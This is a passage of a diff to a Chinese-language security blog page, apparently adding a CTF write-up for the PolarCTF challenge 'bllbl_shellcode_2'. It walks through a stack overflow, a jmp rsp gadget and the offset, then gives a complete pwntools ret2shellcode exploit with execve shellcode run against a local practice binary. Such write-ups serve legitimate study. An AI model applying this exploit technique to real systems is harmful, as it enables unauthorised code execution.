class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="bllbl-shellcode-2"><a href="#bllbl-shellcode-2" class="headerlink" title="bllbl_shellcode_2"></a>bllbl_shellcode_2</h1><p>知识点：</p>
+<ul>
+<li>ret2shellcode</li>
+</ul>
+<h2 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec，64位，保护全关，既然NX保护是关的，意味着可以用ret2shellcode打。<br><img src="/image-25.png"></p>
+<p>IDA里面看到yichu函数发生溢出，并且直接把写入的地址给我们了。</p>
+<p><img src="/image-26.png"></p>
+<p>还给了我们<code>jsp rsp</code>指令</p>
+<p><img src="/image-29.png"></p>
+<p>那么思路就是将shellode写到栈上去，利用<code>jsp rsp</code>指令跳转到shellcode写入地址，执行shellcode即可。</p>
+<p>这里再讲一下偏移，下断点到read处，输入<code>aaaaaaaa</code>：</p>
+<p><img src="/image-24.png"></p>
+<p>看到他是从<code>rsi-3</code>的位置开始写入的，那么写入<code>13个字节 ( = 16 - 3)</code>就能覆盖到返回地址。</p>
+<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">io = process(&#x27;bllbl_shellcode_2&#x27;)</span><br><span class="line"></span><br><span class="line">jmp_rsp = 0x401380</span><br><span class="line">binsh_addr = 0x402047</span><br><span class="line"></span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">buf_addr = int(io.recv(12),16)</span><br><span class="line">success(&#x27;buf_addr = &gt;&gt;&gt; 0x%x&#x27; % buf_addr)</span><br><span class="line"></span><br><span class="line">shellcode = asm(&quot;&quot;&quot;</span><br><span class="line">mov al,0x3b;</span><br><span class="line">mov esi,edi</span><br><span class="line">mov edi,0x402047</span><br><span class="line">mov edx,esi</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">shellcode += p64(jmp_rsp)</span><br><span class="line">shellcode += asm(&quot;&quot;&quot;</span><br><span class="line">sub rsp,21;   # 13+8</span><br><span class="line">jmp rsp</span><br><span class="line">&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(io, &#x27;b *0x401376&#x27;)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><blockquote>
+<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzI1MDJfOTEyNjkyMTYvYXJ0aWNsZS9kZXRhaWxzLzE0NjQ1MzU2NA==">https://blog.csdn.net/2502_91269216/article/details/146453564<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMW0zWG5ZNkVBNQ==">https://www.bilibili.com/video/BV1m3XnY6EA5<i class="fa fa-external-link-alt"></i></span></p>
+</blockquote>
 
     </div>
 
@@ -416,7 +412,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://kubansec.github.io/posts/b08e/" title="【buuCTF刷题】asis2016_b00ks">http://kubansec.github.io/posts/b08e/</a>
+      <a href="http://kubansec.github.io/posts/b08e/" title="PolarCTF2025春季个人挑战赛——部分WP">http://kubansec.github.io/posts/b08e/</a>
   </li>
   <li class="post-copyright-license">
       <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -424,6 +420,14 @@
 </ul>
 </div>
 
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/PolarCTF/" rel="tag"># PolarCTF</a>
+              <a href="/tags/koi/" rel="tag"># koi</a>
+              <a href="/tags/bllhl-mom/" rel="tag"># bllhl_mom</a>
+              <a href="/tags/bllbl-shellcode-2/" rel="tag"># bllbl_shellcode_2</a>
+              <a href="/tags/libc/" rel="tag"># libc</a>
+          </div>
 
         
 
@@ -434,8 +438,8 @@
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/7f21/" rel="next" title="【IOT安全】MIPS架构初探">
-                  【IOT安全】MIPS架构初探 <i class="fa fa-angle-right"></i>
+                <a href="/posts/b08e/" rel="next" title="【buuCTF刷题】asis2016_b00ks">
+                  【buuCTF刷题】asis2016_b00ks <i class="fa fa-angle-right"></i>
                 </a>
             </div>
           </div>
@@ -467,13 +471,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">47k</span>
+    <span title="站点总字数">53k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">43 分钟</span>
+    <span title="站点阅读时长">48 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
